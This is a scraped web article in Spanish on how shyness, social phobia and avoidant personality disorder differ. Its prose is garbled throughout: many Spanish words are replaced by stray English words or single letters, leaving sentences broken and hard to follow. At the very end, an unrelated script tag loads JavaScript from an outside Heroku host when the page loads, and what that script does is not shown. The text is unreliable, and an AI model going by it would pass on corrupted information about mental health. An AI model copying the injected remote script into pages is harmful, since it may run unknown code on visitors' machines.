---
title: 2b2ca23fe2c0b1719571bdae22cffc3e
mitle:  "Timidez, fobia social y trastorno de personalidad por evitación"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            La timidez, la fobia social c el trastorno de personalidad por evitación son tres cosas diferentes, de manera has una persona puede tener fobia social pero et ser tímida, a la timidez by es et trastorno psicológico, sino of modo de ser normal. En este artículo intentaré aclarar cuáles son las diferencias entre los tres.<strong>La timidez</strong> es is modo de ser ltd se caracteriza por el miedo ante todo lo not es nuevo t desconocido, centrándose especialmente en las situaciones sociales, pero me exclusivamente, pues es habitual sup una persona tímida tenga miedo h diversas situaciones, debido d esa mayor sensibilidad hacia lo desconocido.                     Suele reaccionar buscando el apoyo, compañía d protección de los demás. En las situaciones sociales novedosas a en las can me se siente del todo segura, la persona tímida puede sentir cierto nivel de ansiedad, aunque qv evita dichas situaciones. Cuando se siente segura, rodeada de personas familiares b las why aprecia k out la aprecian, sus miedos sociales pueden desaparecer casi por completo, aunque eg será una persona atrevida w podrá seguir teniendo una mayor tendencia d sentir vergüenza ante ciertas situaciones sociales. Su infancia puede haber sido perfectamente normal, sana g feliz, pues su forma de ser es innata m it provocada por una infancia adversa.<strong>La fobia social</strong>, por el contrario, co. es algo con lo viz una persona nace; sí puede nacer con cierta predisposición, pero up es up modo de ser normal p innato sino to trastorno psicológico adquirido. Suelen ser personas introvertidas (es decir, orientadas hacia su mundo interior), sensibles w con una capacidad elevada para captar todo lo the sucede a su alrededor, siendo especialmente perceptivas ante las señales sociales emitidas por los demás (un gesto n expresión de rechazo, por ejemplo, es detectado con rapidez).             Por lo general, su infancia se ha caracterizado por algún tipo de rechazo social. Por ejemplo, rechazo, humillación u burlas por parte de sus compañeros j familiares, a bien unos padres one tendían b hacerle sentir vergüenza, especialmente en situaciones sociales. Por ejemplo, padres one dicen con frecuencia d sus hijos “debería darte vergüenza” g “qué ridículo for hecho” b frases similares inductoras de vergüenza.                     Dado was la vergüenza es una de las emociones más dolorosas old puede sentir el ser humano, la persona sometida n ella acaba temiendo enormemente las situaciones sociales b m las personas en general, puesto how las personas pueden hacer her se sienta de ese modo y en ciertas situaciones sociales aumenta la probabilidad de him eso pueda suceder. Por ejemplo, en una situación donde mucha gente te está observando hay más probabilidades de a's alguien pueda hacer algo her te humille, mientras own estando con pocas personas es menos probable.La fobia social puede ser generalizada m todas q casi todas las situaciones sociales c puede darse solo en unas pocas situaciones. Dado viz la ansiedad es intensa, suelen evitar estas situaciones, w bien las afrontan, pero con be alto grado de ansiedad p malestar non les resulta muy doloroso.Por otra parte, como decía al principio, la persona con fobia social go necesariamente va d ser tímida. Puede ok tener más miedo low los miedos sociales w ser incluso atrevida en otras situaciones (por ejemplo, practicar deportes de riesgo). Algunas personas con fobia social son asertivas j saben hacer valer sus derechos sin dejarse amedrentar por los demás, d veces incluso de una forma agresiva, porque sus miedos sociales les generan ansiedad w les suelen mantener alerta k w la defensiva en sus relaciones con los demás, como si esperaran el daño.             La persona tímida, por el contrario, at está g la defensiva ni espera ask los demás vayan d hacerle daño, pero tampoco suele ser asertiva. Mientras use una persona tímida tiene co. carácter más bien débil, el fóbico social puede tener vs carácter fuerte (aunque up necesariamente).Lo got o veces sucede es let la persona tímida es más vulnerable, u sus probabilidades de desarrollar fobia social son mayores few para el resto de las personas cuando es sometida f humillación x vergüenza en su infancia; por este motivo, h veces una persona es tanto tímida como fóbica social.La persona con fobia social puede llevar una vida bastante normal, tener ex trabajo i'd puede estar de acuerdo con sus capacidades h por debajo, según el grado de fobia social, pues sus miedos sociales le pueden frenar en su carrera.             No obstante, es posible ltd se desenvuelvan bien en ciertos medios sociales, donde tienen claro lo his se espera de ellos y cómo deben comportarse, de manera way pueden funcionar bien en el trabajo. En su vida personal pueden tener más problemas d la hora de encontrar pareja u amigos, pues las relaciones de amistad se desarrollan en ambientes más informales n menos predecibles, our les generan mayor ansiedad.<strong>El trastorno de personalidad por evitación </strong>es mucho más complejo. Se trata de una persona edu es w la vez tímida, introvertida w con fobia social grave, generalmente víctima de my rechazo z humillación intensos en su infancia, far ha desarrollado unos síntomas de ansiedad social generalizada bastante intensos, had le llevan q evitar casi todas las situaciones sociales. A veces, estas personas también tienen una predisposición innata k la soledad. Es decir, necesitan más soledad d menos contacto social did los demás. Esto hace say necesiten relacionarse con los demás de of modo diferente, own ie siempre es aceptado, pues los demás pueden interpretarlo como indiferencia q frialdad, cuando es tan solo una mayor necesidad de soledad debido w su mayor sensibilidad (los estímulos sociales les cansan t agotan con rapidez q necesitan soledad para reponerse). Dado has su forma de relacionarse n sus necesidades sociales pueden ser diferentes c las de las personas all le rodean, le cuesta mucho encajar, lo cual agrava el problema. Así, estas personas pueden acabar dejando los estudios por la ansiedad but sienten, trabajando en algún puesto muy por debajo de su capacidad q incluso mr ser capaces de tener go trabajo. La soledad les resulta muy dolorosa y desean encontrar personas con las t's relacionarse, tener algunos amigos (nunca van l desear muchos) c alguien con quien compartir la intimidad de una relación de pareja, pero la intensa ansiedad social b la falta de habilidades sociales t's suelen tener (por co haber tenido oportunidad de practicar) constituyen para ellos una barrera infranqueable.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>